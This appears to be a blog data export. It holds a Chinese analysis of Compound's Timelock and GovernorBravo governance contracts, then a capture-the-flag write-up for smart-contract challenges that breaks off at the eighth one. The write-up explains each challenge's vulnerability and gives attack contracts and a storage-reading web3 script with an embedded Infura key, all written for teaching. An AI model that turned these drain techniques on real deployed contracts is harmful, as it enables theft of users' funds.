admin.\");\n\n    bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n    require(queuedTransactions[txHash], \"Timelock::executeTransaction: Transaction hasn't been queued.\");\n    require(getBlockTimestamp() >= eta, \"Timelock::executeTransaction: Transaction hasn't surpassed time lock.\");\n    require(getBlockTimestamp() &lt;= eta.add(GRACE_PERIOD), \"Timelock::executeTransaction: Transaction is stale.\");\n\n    queuedTransactions[txHash] = false;\n\n    bytes memory callData;\n\n    if (bytes(signature).length == 0) &#123;\n        callData = data;\n    &#125; else &#123;\n        callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data);\n    &#125;\n\n    // solium-disable-next-line security/no-call-value\n    (bool success, bytes memory returnData) = target.call&#123;value: value&#125;(callData);\n    require(success, \"Timelock::executeTransaction: Transaction execution reverted.\");\n\n    emit ExecuteTransaction(txHash, target, value, signature, data, eta);\n\n    return returnData;\n&#125;\n\nGovernorBravoCode\nClick to see more\npragma solidity ^0.5.16;\npragma experimental ABIEncoderV2;\n\nimport \"./GovernorBravoInterfaces.sol\";\n\ncontract GovernorBravoDelegate is GovernorBravoDelegateStorageV1, GovernorBravoEvents &#123;\n\n    /// @notice The name of this contract\n    string public constant name = \"Compound Governor Bravo\";\n\n    /// @notice The minimum setable proposal threshold\n    uint public constant MIN_PROPOSAL_THRESHOLD = 50000e18; // 50,000 Comp\n\n    /// @notice The number of votes in support of a proposal required in order for a quorum to be reached and for a vote to succeed\n    function quorumVotes() public pure returns (uint) &#123; return 400000e18; &#125; // 400,000 = 4% of Comp\n\n    /// @notice The maximum number of actions that can be included in a proposal\n    function proposalMaxOperations() public pure returns (uint) &#123; return 10; &#125; // 10 actions\n\n    /// @notice The EIP-712 typehash for the contract's domain\n    bytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\n\n    /// @notice The EIP-712 typehash for the ballot struct used by the contract\n    bytes32 public constant BALLOT_TYPEHASH = keccak256(\"Ballot(uint256 proposalId,uint8 support)\");\n\n    function initialize(address timelock_, address comp_, uint votingPeriod_, uint votingDelay_, uint proposalThreshold_) public &#123;\n        require(msg.sender == admin, \"GovernorBravo::initialize: admin only\");\n        timelock = TimelockInterface(timelock_);\n        comp = CompInterface(comp_);\n        votingPeriod = votingPeriod_;\n        votingDelay = votingDelay_;\n        proposalThreshold = proposalThreshold_;\n    &#125;\n\n    function propose(address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description) public returns (uint) &#123;\n        // Reject proposals before initiating as Governor\n        require(initialProposalId != 0, \"GovernorBravo::propose: Governor Bravo not active\");\n        require(comp.getPriorVotes(msg.sender, sub256(block.number, 1)) > proposalThreshold, \"GovernorBravo::propose: proposer votes below proposal threshold\");\n        require(targets.length == values.length &amp;&amp; targets.length == signatures.length &amp;&amp; targets.length == calldatas.length, \"GovernorBravo::propose: proposal function information arity mismatch\");\n        require(targets.length != 0, \"GovernorBravo::propose: must provide actions\");\n        require(targets.length &lt;= proposalMaxOperations(), \"GovernorBravo::propose: too many actions\");\n\n        uint latestProposalId = latestProposalIds[msg.sender];\n        if (latestProposalId != 0) &#123;\n          ProposalState proposersLatestProposalState = state(latestProposalId);\n          require(proposersLatestProposalState != ProposalState.Active, \"GovernorBravo::propose: one live proposal per proposer, found an already active proposal\");\n          require(proposersLatestProposalState != ProposalState.Pending, \"GovernorBravo::propose: one live proposal per proposer, found an already pending proposal\");\n        &#125;\n\n        uint startBlock = add256(block.number, votingDelay);\n        uint endBlock = add256(startBlock, votingPeriod);\n\n        proposalCount++;\n        Proposal memory newProposal = Proposal(&#123;\n            id: proposalCount,\n            proposer: msg.sender,\n            eta: 0,\n            targets: targets,\n            values: values,\n            signatures: signatures,\n            calldatas: calldatas,\n            startBlock: startBlock,\n            endBlock: endBlock,\n            forVotes: 0,\n            againstVotes: 0,\n            abstainVotes: 0,\n            canceled: false,\n            executed: false\n        &#125;);\n\n        proposals[newProposal.id] = newProposal;\n        latestProposalIds[newProposal.proposer] = newProposal.id;\n\n        emit ProposalCreated(newProposal.id, msg.sender, targets, values, signatures, calldatas, startBlock, endBlock, description);\n        return newProposal.id;\n    &#125;\n\n    function queue(uint proposalId) external &#123;\n        require(state(proposalId) == ProposalState.Succeeded, \"GovernorBravo::queue: proposal can only be queued if it is succeeded\");\n        Proposal storage proposal = proposals[proposalId];\n        uint eta = add256(block.timestamp, timelock.delay());\n        for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n            _queueOrRevert(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], eta);\n        &#125;\n        proposal.eta = eta;\n        emit ProposalQueued(proposalId, eta);\n    &#125;\n\n    function _queueOrRevert(address target, uint value, string memory signature, bytes memory data, uint eta) internal &#123;\n        require(!timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))), \"GovernorBravo::_queueOrRevert: proposal action already queued at eta\");\n        timelock.queueTransaction(target, value, signature, data, eta);\n    &#125;\n\n    function execute(uint proposalId) external payable &#123;\n        require(state(proposalId) == ProposalState.Queued, \"GovernorBravo::execute: proposal can only be executed if it is queued\");\n        Proposal storage proposal = proposals[proposalId];\n        proposal.executed = true;\n        for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n            timelock.executeTransaction.value(proposal.values[i])(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n        &#125;\n        emit ProposalExecuted(proposalId);\n    &#125;\n\n    function cancel(uint proposalId) external &#123;\n        ProposalState state = state(proposalId);\n        require(state != ProposalState.Executed, \"GovernorBravo::cancel: cannot cancel executed proposal\");\n\n        Proposal storage proposal = proposals[proposalId];\n        require(msg.sender == proposal.proposer || comp.getPriorVotes(proposal.proposer, sub256(block.number, 1)) &lt; proposalThreshold, \"GovernorBravo::cancel: proposer above threshold\");\n\n        proposal.canceled = true;\n        for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n            timelock.cancelTransaction(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n        &#125;\n\n        emit ProposalCanceled(proposalId);\n    &#125;\n\n    function getActions(uint proposalId) external view returns (address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas) &#123;\n        Proposal storage p = proposals[proposalId];\n        return (p.targets, p.values, p.signatures, p.calldatas);\n    &#125;\n\n    function getReceipt(uint proposalId, address voter) external view returns (Receipt memory) &#123;\n        return proposals[proposalId].receipts[voter];\n    &#125;\n\n    function state(uint proposalId) public view returns (ProposalState) &#123;\n        require(proposalCount >= proposalId &amp;&amp; proposalId > initialProposalId, \"GovernorBravo::state: invalid proposal id\");\n        Proposal storage proposal = proposals[proposalId];\n        if (proposal.canceled) &#123;\n            return ProposalState.Canceled;\n        &#125; else if (block.number &lt;= proposal.startBlock) &#123;\n            return ProposalState.Pending;\n        &#125; else if (block.number &lt;= proposal.endBlock) &#123;\n            return ProposalState.Active;\n        &#125; else if (proposal.forVotes &lt;= proposal.againstVotes || proposal.forVotes &lt; quorumVotes()) &#123;\n            return ProposalState.Defeated;\n        &#125; else if (proposal.eta == 0) &#123;\n            return ProposalState.Succeeded;\n        &#125; else if (proposal.executed) &#123;\n            return ProposalState.Executed;\n        &#125; else if (block.timestamp >= add256(proposal.eta, timelock.GRACE_PERIOD())) &#123;\n            return ProposalState.Expired;\n        &#125; else &#123;\n            return ProposalState.Queued;\n        &#125;\n    &#125;\n\n    /**\n      * @notice Cast a vote for a proposal\n      * @param proposalId The id of the proposal to vote on\n      * @param support The support value for the vote. 0=against, 1=for, 2=abstain\n      */\n    function castVote(uint proposalId, uint8 support) external &#123;\n        emit VoteCast(msg.sender, proposalId, support, _castVote(msg.sender, proposalId, support), \"\");\n    &#125;\n\n    /**\n      * @notice Cast a vote for a proposal with a reason\n      * @param proposalId The id of the proposal to vote on\n      * @param support The support value for the vote. 0=against, 1=for, 2=abstain\n      * @param reason The reason given for the vote by the voter\n      */\n    function castVoteWithReason(uint proposalId, uint8 support, string calldata reason) external &#123;\n        emit VoteCast(msg.sender, proposalId, support, _castVote(msg.sender, proposalId, support), reason);\n    &#125;\n\n    /**\n      * @notice Cast a vote for a proposal by signature\n      * @dev External function that accepts EIP-712 signatures for voting on proposals.\n      */\n    function castVoteBySig(uint proposalId, uint8 support, uint8 v, bytes32 r, bytes32 s) external &#123;\n        bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));\n        bytes32 structHash = keccak256(abi.encode(BALLOT_TYPEHASH, proposalId, support));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash));\n        address signatory = ecrecover(digest, v, r, s);\n        require(signatory != address(0), \"GovernorBravo::castVoteBySig: invalid signature\");\n        emit VoteCast(signatory, proposalId, support, _castVote(signatory, proposalId, support), \"\");\n    &#125;\n\n    /**\n      * @notice Internal function that caries out voting logic\n      * @param voter The voter that is casting their vote\n      * @param proposalId The id of the proposal to vote on\n      * @param support The support value for the vote. 0=against, 1=for, 2=abstain\n      * @return The number of votes cast\n      */\n    function _castVote(address voter, uint proposalId, uint8 support) internal returns (uint96) &#123;\n        require(state(proposalId) == ProposalState.Active, \"GovernorBravo::_castVote: voting is closed\");\n        require(support &lt;= 2, \"GovernorBravo::_castVote: invalid vote type\");\n        Proposal storage proposal = proposals[proposalId];\n        Receipt storage receipt = proposal.receipts[voter];\n        require(receipt.hasVoted == false, \"GovernorBravo::_castVote: voter already voted\");\n        uint96 votes = comp.getPriorVotes(voter, proposal.startBlock);\n\n        if (support == 0) &#123;\n            proposal.againstVotes = add256(proposal.againstVotes, votes);\n        &#125; else if (support == 1) &#123;\n            proposal.forVotes = add256(proposal.forVotes, votes);\n        &#125; else if (support == 2) &#123;\n            proposal.abstainVotes = add256(proposal.abstainVotes, votes);\n        &#125;\n\n        receipt.hasVoted = true;\n        receipt.support = support;\n        receipt.votes = votes;\n\n        return votes;\n    &#125;\n\n    /*\n     * @notice Admin function for setting the voting delay\n     * @param newVotingDelay new voting delay, in blocks\n     */\n    function _setVotingDelay(uint newVotingDelay) external &#123;\n        require(msg.sender == admin, \"GovernorBravo::_setVotingDelay: admin only\");\n        uint oldVotingDelay = votingDelay;\n        votingDelay = newVotingDelay;\n\n        emit VotingDelaySet(oldVotingDelay,votingDelay);\n    &#125;\n\n    /*\n     * @notice Admin function for setting the voting period\n     * @param newVotingPeriod new voting period, in blocks\n     */\n    function _setVotingPeriod(uint newVotingPeriod) external &#123;\n        require(msg.sender == admin, \"GovernorBravo::_setVotingPeriod: admin only\");\n        uint oldVotingPeriod = votingPeriod;\n        votingPeriod = newVotingPeriod;\n\n        emit VotingPeriodSet(oldVotingPeriod, votingPeriod);\n    &#125;\n\n    /*\n     * @notice Admin function for setting the proposal threshold\n     * @dev newProposalThreshold must be greater than the hardcoded min\n     * @param newProposalThreshold new proposal threshold\n     */\n    function _setProposalThreshold(uint newProposalThereshold) external &#123;\n        require(msg.sender == admin, \"GovernorBravo::_setProposalThreshold: admin only\");\n        require(newProposalThereshold >= MIN_PROPOSAL_THRESHOLD, \"GovernorBravo::_setProposalThreshold: new threshold below min\");\n        uint oldProposalThreshold = proposalThreshold;\n        proposalThreshold = newProposalThereshold;\n\n        emit ProposalThresholdSet(oldProposalThreshold, proposalThreshold);\n    &#125;\n\n    /**\n      * @notice Initiate the GovernorBravo contract\n      * @dev Admin only. Sets initial proposal id which initiates the contract, ensuring a continious proposal id count\n      * @param governorAlpha The address for the Governor to continue the proposal id count from\n      */\n    function _initiate(address governorAlpha) external &#123;\n        require(msg.sender == admin, \"GovernorBravo::_initiate: admin only\");\n        require(initialProposalId == 0, \"GovernorBravo::_initiate: can only initiate once\");\n        proposalCount = GovernorAlpha(governorAlpha).proposalCount();\n        initialProposalId = proposalCount;\n        timelock.acceptAdmin();\n    &#125;\n\n    /**\n      * @notice Begins transfer of admin rights. The newPendingAdmin must call `_acceptAdmin` to finalize the transfer.\n      * @dev Admin function to begin change of admin. The newPendingAdmin must call `_acceptAdmin` to finalize the transfer.\n      * @param newPendingAdmin New pending admin.\n      */\n    function _setPendingAdmin(address newPendingAdmin) external &#123;\n        // Check caller = admin\n        require(msg.sender == admin, \"GovernorBravoDelegator:_setPendingAdmin: admin only\");\n\n        // Save current value, if any, for inclusion in log\n        address oldPendingAdmin = pendingAdmin;\n\n        // Store pendingAdmin with value newPendingAdmin\n        pendingAdmin = newPendingAdmin;\n\n        // Emit NewPendingAdmin(oldPendingAdmin, newPendingAdmin)\n        emit NewPendingAdmin(oldPendingAdmin, newPendingAdmin);\n    &#125;\n\n    /**\n      * @notice Accepts transfer of admin rights. msg.sender must be pendingAdmin\n      * @dev Admin function for pending admin to accept role and update admin\n      */\n    function _acceptAdmin() external &#123;\n        // Check caller is pendingAdmin and pendingAdmin ≠ address(0)\n        require(msg.sender == pendingAdmin &amp;&amp; msg.sender != address(0), \"GovernorBravoDelegator:_acceptAdmin: admin only\");\n\n        // Save current values for inclusion in log\n        address oldAdmin = admin;\n        address oldPendingAdmin = pendingAdmin;\n\n        // Store admin with value pendingAdmin\n        admin = pendingAdmin;\n\n        // Clear the pending value\n        pendingAdmin = address(0);\n\n        emit NewAdmin(oldAdmin, admin);\n        emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);\n    &#125;\n\n    function add256(uint256 a, uint256 b) internal pure returns (uint) &#123;\n        uint c = a + b;\n        require(c >= a, \"addition overflow\");\n        return c;\n    &#125;\n\n    function sub256(uint256 a, uint256 b) internal pure returns (uint) &#123;\n        require(b &lt;= a, \"subtraction underflow\");\n        return a - b;\n    &#125;\n\n    function getChainId() internal pure returns (uint) &#123;\n        uint chainId;\n        assembly &#123; chainId := chainid() &#125;\n        return chainId;\n    &#125;\n&#125;\n\n\n\nAnalyze对应的vote token为DFH\n和Governance Alpha大体相同，但是有所区别，在该合约中VotingDelay，VotingPeriod和ProposalThreshold变量可以修改而不是合约建立后就不可变\n提案条件判断也从票数大于提案门槛变成票数大于提案门槛或提案者是白名单账户，并且要求了初始提案数目不为0，此处的初始提案数量来自Governance Alpha，其余条件相同\n投票时将bool型的support改为了uint8类型，只有0，1，2值为有效值，相当于在支持与否的情况下新增了弃权票，同时在投票出做出的改变还有castVoteWithReason，允许投票者以一定的理由进行投票.票数以提案投票开始时对应块的票数。\n采用了proxy的方式，便于合约的更新\ncontract GovernorBravoDelegator is GovernorBravoDelegatorStorage, GovernorBravoEvents &#123;\n\tconstructor(\n\t\t\taddress timelock_,\n\t\t\taddress uni_,\n\t\t\taddress admin_,\n\t        address implementation_,\n\t        uint votingPeriod_,\n\t        uint votingDelay_,\n            uint proposalThreshold_) public &#123;\n\n        // Admin set to msg.sender for initialization\n        admin = msg.sender;\n\n        delegateTo(implementation_, abi.encodeWithSignature(\"initialize(address,address,uint256,uint256,uint256)\",\n                                                            timelock_,\n                                                            uni_,\n                                                            votingPeriod_,\n                                                            votingDelay_,\n                                                            proposalThreshold_));\n\n        _setImplementation(implementation_);\n\n\t\tadmin = admin_;\n\t&#125;\n\n\n\t/**\n     * @notice Called by the admin to update the implementation of the delegator\n     * @param implementation_ The address of the new implementation for delegation\n     */\n    function _setImplementation(address implementation_) public &#123;\n        require(msg.sender == admin, \"GovernorBravoDelegator::_setImplementation: admin only\");\n        require(implementation_ != address(0), \"GovernorBravoDelegator::_setImplementation: invalid implementation address\");\n\n        address oldImplementation = implementation;\n        implementation = implementation_;\n\n        emit NewImplementation(oldImplementation, implementation);\n    &#125;\n\n    /**\n     * @notice Internal method to delegate execution to another contract\n     * @dev It returns to the external caller whatever the implementation returns or forwards reverts\n     * @param callee The contract to delegatecall\n     * @param data The raw data to delegatecall\n     */\n    function delegateTo(address callee, bytes memory data) internal &#123;\n        (bool success, bytes memory returnData) = callee.delegatecall(data);\n        assembly &#123;\n            if eq(success, 0) &#123;\n                revert(add(returnData, 0x20), returndatasize)\n            &#125;\n        &#125;\n    &#125;\n\n\t/**\n     * @dev Delegates execution to an implementation contract.\n     * It returns to the external caller whatever the implementation returns\n     * or forwards reverts.\n     */\n    function () external payable &#123;\n        // delegate all other functions to current implementation\n        (bool success, ) = implementation.delegatecall(msg.data);\n\n        assembly &#123;\n              let free_mem_ptr := mload(0x40)\n              returndatacopy(free_mem_ptr, 0, returndatasize)\n\n              switch success\n              case 0 &#123; revert(free_mem_ptr, returndatasize) &#125;\n              default &#123; return(free_mem_ptr, returndatasize) &#125;\n        &#125;\n    &#125;\n&#125;\n\n主体逻辑是相同的，代码就不再分析了\nsummarycompound实现了对defi项目的治理，采用投票的方式进行公平决策，持有vote token即可参与投票，投票结束后判断成功与否执行对应的操作进而公平公正的实现了defi的治理\n其中Governor Alpha和Governor Bravo有所区别，在此简单的对比总结一下\n\n\n\n\n\nexample\n\n\n\n参数不可更新\n参数可更新\nVotingDelay，VotingPeriod，ProposalThreshold等变量\n\n\n仅存在yes，no 选择\n除yes，no外新增了abstain\nx\n\n\n投票时不能携带理由或评论\n投票时可以携带理由或评论\n投票函数增加了string类型的reason变量\n\n\n每次更新需要重置提案编号\n维护固定且连续的提案编号\nx\n\n\n","slug":"Compound","date":"2022-08-01T10:42:57.893Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"2dde006a1ba2b506fb11671b03da33e3","title":"Smart Contract ctf","content":"题库地址：https://blockchain-ctf.securityinnovation.com/#/\n\n\n1.DonationCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract Donation is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public funds;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        funds = funds.add(msg.value);\n    &#125;\n    \n    function() external payable ctf&#123;\n        funds = funds.add(msg.value);\n    &#125;\n\n    function withdrawDonationsFromTheSuckersWhoFellForIt() external ctf&#123;\n        msg.sender.transfer(funds);\n        funds = 0;\n    &#125;\n\n&#125;\n\nAnalyze这一关没什么难度，直接调用withdrawDonationsFromTheSuckersWhoFellForIt()就可以了\nAttack复制合约以及合约地址，在remix中ataddress并进行调用即可\n2.Lock BoxCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract Lockbox1 is CtfFramework&#123;\n\n    uint256 private pin;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        pin = now%10000;\n    &#125;\n    \n    function unlock(uint256 _pin) external ctf&#123;\n        require(pin == _pin, \"Incorrect PIN\");\n        msg.sender.transfer(address(this).balance);\n    &#125;\n\n&#125;\n\nAnalyze这道题考验了智能合约的变量存储机制，想要完成该题需要知道pin，而pin是private存储方式，可以使用web3脚本进行获得，pin存储在slot0，直接获得即可。\nAttackfrom web3 import Web3,HTTPProvider\nw3=Web3(HTTPProvider('https://ropsten.infura.io/v3/071f682145af4cfc9f0b92a497e89431'))\nbaddress='0xb7f93403a2215240f29e7e502dcc497cf3d893a0'\naddress=Web3.toChecksumAddress(baddress)\nprint(w3.eth.getStorageAt(address,0))\n\n在进行调用即可\n3.Piggy BankCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract PiggyBank is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public piggyBalance;\n    string public name;\n    address public owner;\n    \n    constructor(address _ctfLauncher, address _player, string _name) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        name=_name;\n        owner=msg.sender;\n        piggyBalance=piggyBalance.add(msg.value);\n    &#125;\n    \n    function() external payable ctf&#123;\n        piggyBalance=piggyBalance.add(msg.value);\n    &#125;\n\n    \n    modifier onlyOwner()&#123;\n        require(msg.sender == owner, \"Unauthorized: Not Owner\");\n        _;\n    &#125;\n\n    function withdraw(uint256 amount) internal&#123;\n        piggyBalance = piggyBalance.sub(amount);\n        msg.sender.transfer(amount);\n    &#125;\n\n    function collectFunds(uint256 amount) public onlyOwner ctf&#123;\n        require(amount&lt;=piggyBalance, \"Insufficient Funds in Contract\");\n        withdraw(amount);\n    &#125;\n    \n&#125;\n\n\ncontract CharliesPiggyBank is PiggyBank&#123;\n    \n    uint256 public withdrawlCount;\n    \n    constructor(address _ctfLauncher, address _player) public payable\n        PiggyBank(_ctfLauncher, _player, \"Charlie\") \n    &#123;\n        withdrawlCount = 0;\n    &#125;\n    \n    function collectFunds(uint256 amount) public ctf&#123;\n        require(amount&lt;=piggyBalance, \"Insufficient Funds in Contract\");\n        withdrawlCount = withdrawlCount.add(1);\n        withdraw(amount);\n    &#125;\n    \n&#125;\n\nAnalyzePiggyBank里的withdraw标了internal，只能在内部调用。collectFunds又有onlyOwner，基本安全。\n但CharliesPiggyBank在继承时为了制造漏洞强行重写了collectFunds，去掉了msg.sender的限制。\nAttack计算数值直接调用即可\n4.SI Token SaleCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\n// https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.8.0/contracts/token/ERC20/StandardToken.sol\nimport \"../StandardToken.sol\";\n\ncontract SIToken is StandardToken &#123;\n\n    using SafeMath for uint256;\n\n    string public name = \"SIToken\";\n    string public symbol = \"SIT\";\n    uint public decimals = 18;\n    uint public INITIAL_SUPPLY = 1000 * (10 ** decimals);\n\n    constructor() public&#123;\n        totalSupply_ = INITIAL_SUPPLY;\n        balances[this] = INITIAL_SUPPLY;\n    &#125;\n&#125;\n\ncontract SITokenSale is SIToken, CtfFramework &#123;\n\n    uint256 public feeAmount;\n    uint256 public etherCollection;\n    address public developer;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        feeAmount = 10 szabo; \n        developer = msg.sender;\n        purchaseTokens(msg.value);\n    &#125;\n\n    function purchaseTokens(uint256 _value) internal&#123;\n        require(_value > 0, \"Cannot Purchase Zero Tokens\");\n        require(_value &lt; balances[this], \"Not Enough Tokens Available\");\n        balances[msg.sender] += _value - feeAmount;\n        balances[this] -= _value;\n        balances[developer] += feeAmount; \n        etherCollection += msg.value;\n    &#125;\n\n    function () payable external ctf&#123;\n        purchaseTokens(msg.value);\n    &#125;\n\n    // Allow users to refund their tokens for half price ;-)\n    function refundTokens(uint256 _value) external ctf&#123;\n        require(_value>0, \"Cannot Refund Zero Tokens\");\n        transfer(this, _value);\n        etherCollection -= _value/2;\n        msg.sender.transfer(_value/2);\n    &#125;\n\n    function withdrawEther() external ctf&#123;\n        require(msg.sender == developer, \"Unauthorized: Not Developer\");\n        require(balances[this] == 0, \"Only Allowed Once Sale is Complete\");\n        msg.sender.transfer(etherCollection);\n    &#125;\n\n&#125;\n\nAnalyze题目漏洞比较简单，就是一步整数溢出漏洞 \nAttackbalances[msg.sender] +&#x3D; _value – feeAmount，当value足够小时，balances[msg.sender]溢出为大整数。查看etherCollection，并计算二倍值调用refundTokens()即可\n5.Secure BankCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract SimpleBank is CtfFramework&#123;\n\n    mapping(address => uint256) public balances;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        balances[msg.sender] = msg.value;\n    &#125;\n\n    function deposit(address _user) public payable ctf&#123;\n        balances[_user] += msg.value;\n    &#125;\n\n    function withdraw(address _user, uint256 _value) public ctf&#123;\n        require(_value&lt;=balances[_user], \"Insufficient Balance\");\n        balances[_user] -= _value;\n        msg.sender.transfer(_value);\n    &#125;\n\n    function () public payable ctf&#123;\n        deposit(msg.sender);\n    &#125;\n\n&#125;\n\ncontract MembersBank is SimpleBank&#123;\n\n    mapping(address => string) public members;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        SimpleBank(_ctfLauncher, _player)\n    &#123;\n    &#125;\n\n    function register(address _user, string _username) public ctf&#123;\n        members[_user] = _username;\n    &#125;\n\n    modifier isMember(address _user)&#123;\n        bytes memory username = bytes(members[_user]);\n        require(username.length != 0, \"Member Must First Register\");\n        _;\n    &#125;\n\n    function deposit(address _user) public payable isMember(_user) ctf&#123;\n        super.deposit(_user);\n    &#125;\n\n    function withdraw(address _user, uint256 _value) public isMember(_user) ctf&#123;\n        super.withdraw(_user, _value);\n    &#125;\n\n&#125;\n\ncontract SecureBank is MembersBank&#123;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        MembersBank(_ctfLauncher, _player)\n    &#123;\n    &#125;\n\n    function deposit(address _user) public payable ctf&#123;\n        require(msg.sender == _user, \"Unauthorized User\");\n        require(msg.value &lt; 100 ether, \"Exceeding Account Limits\");\n        require(msg.value >= 1 ether, \"Does Not Satisfy Minimum Requirement\");\n        super.deposit(_user);\n    &#125;\n\n    function withdraw(address _user, uint8 _value) public ctf&#123;\n        require(msg.sender == _user, \"Unauthorized User\");\n        require(_value &lt; 100, \"Exceeding Account Limits\");\n        require(_value >= 1, \"Does Not Satisfy Minimum Requirement\");\n        super.withdraw(_user, _value * 1 ether);\n    &#125;\n\n    function register(address _user, string _username) public ctf&#123;\n        require(bytes(_username).length!=0, \"Username Not Enough Characters\");\n        require(bytes(_username).length&lt;=20, \"Username Too Many Characters\");\n        super.register(_user, _username);\n    &#125;\n&#125;\n\nAnalyze函数重写重载问题， 存在function withdraw(address _user, uint256 _value) public isMember(_user) ctf和  function withdraw(address _user, uint8 _value) public ctf两个函数，第一个是uint256并且没有限制msg.sender &#x3D;&#x3D; _user\nAttack在区块链浏览器中找到有钱的user进行register之后调用withdraw即可\n6.LotteryCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract Lottery is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public totalPot;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        totalPot = totalPot.add(msg.value);\n    &#125;\n    \n    function() external payable ctf&#123;\n        totalPot = totalPot.add(msg.value);\n    &#125;\n\n    function play(uint256 _seed) external payable ctf&#123;\n        require(msg.value >= 1 finney, \"Insufficient Transaction Value\");\n        totalPot = totalPot.add(msg.value);\n        bytes32 entropy = blockhash(block.number);\n        bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));\n        bytes32 target = keccak256(abi.encodePacked(entropy^entropy2));\n        bytes32 guess = keccak256(abi.encodePacked(_seed));\n        if(guess==target)&#123;\n            //winner\n            uint256 payout = totalPot;\n            totalPot = 0;\n            msg.sender.transfer(payout);\n        &#125;\n    &#125;    \n\n\n&#125;\n\nAnalyze随机数问题。这种四ui技术只要在同一笔交易中block.numbe是相同的，在一个函数中进行攻击即可\nAttackinterface ctf&#123;\n    function ctf_challenge_add_authorized_sender(address _addr) external;\n&#125;\ncontract attack&#123;\n    Lottery target=Lottery(0x4b6238A6fb8F061b51DA65BC353F448b9B4bF628);\n    constructor() public&#123;&#125;\n    function pwn()public payable&#123;\n        bytes32 entropy = blockhash(block.number);\n        bytes32 entropy2 = keccak256(abi.encodePacked(this));\n        uint seed = uint(entropy^entropy2);\n        target.play.value(1 finney)(seed);\n    &#125;\n    receive() external payable&#123;&#125;\n    function kill(address payable addr)public payable&#123;\n        selfdestruct(addr);\n    &#125;\n&#125;\n\n\n7.Heads or TailsCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract HeadsOrTails is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public gameFunds;\n    uint256 public cost;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        gameFunds = gameFunds.add(msg.value);\n        cost = gameFunds.div(10);\n    &#125;\n    \n    function play(bool _heads) external payable ctf&#123;\n        require(msg.value == cost, \"Incorrect Transaction Value\");\n        require(gameFunds >= cost.div(2), \"Insufficient Funds in Game Contract\");\n        bytes32 entropy = blockhash(block.number-1);\n        bytes1 coinFlip = entropy[0] &amp; 1;\n        if ((coinFlip == 1 &amp;&amp; _heads) || (coinFlip == 0 &amp;&amp; !_heads)) &#123;\n            //win\n            gameFunds = gameFunds.sub(msg.value.div(2));\n            msg.sender.transfer(msg.value.mul(3).div(2));\n        &#125;\n        else &#123;\n            //loser\n            gameFunds = gameFunds.add(msg.value);\n        &#125;\n    &#125;\n\n&#125;\n\nAnalyze赌博游戏，获胜即可多得百分之五，连续正确20次即可，和上一题大同小异主要是增加了if ((coinFlip &#x3D;&#x3D; 1 &amp;&amp; _heads) || (coinFlip &#x3D;&#x3D; 0 &amp;&amp; !_heads))判断条件，但是_heads可控\nAttackpragma solidity 0.4.24;\ninterface Heads&#123;\n    function play(bool _heads) external payable;\n    function ctf_challenge_add_authorized_sender(address _addr) external;\n&#125;\ncontract attack&#123;\n    HeadsOrTails target=HeadsOrTails(0xc7745A854ac557458681240072466aDC54Fa5C17);\n    bool public key;\n    function pwn() public payable&#123;\n        bytes32 entropy = blockhash(block.number-1);\n        bytes1 coinFlip = entropy[0] &amp; 1;\n        if(coinFlip==0)\n        key=false;\n        if(coinFlip==1)\n        key=true;\n        for(uint i=1;i&lt;=20;i++)\n        &#123;target.play.value(0.1 ether)(key);&#125;\n    &#125;\n    function() external payable&#123;&#125;\n    function ret(address addr)public payable&#123;\n        msg.sender.transfer(this.balance);\n    &#125;\n&#125;\n\n8.Record LabelCodepragma solidity 0.4.24;\n\nimport 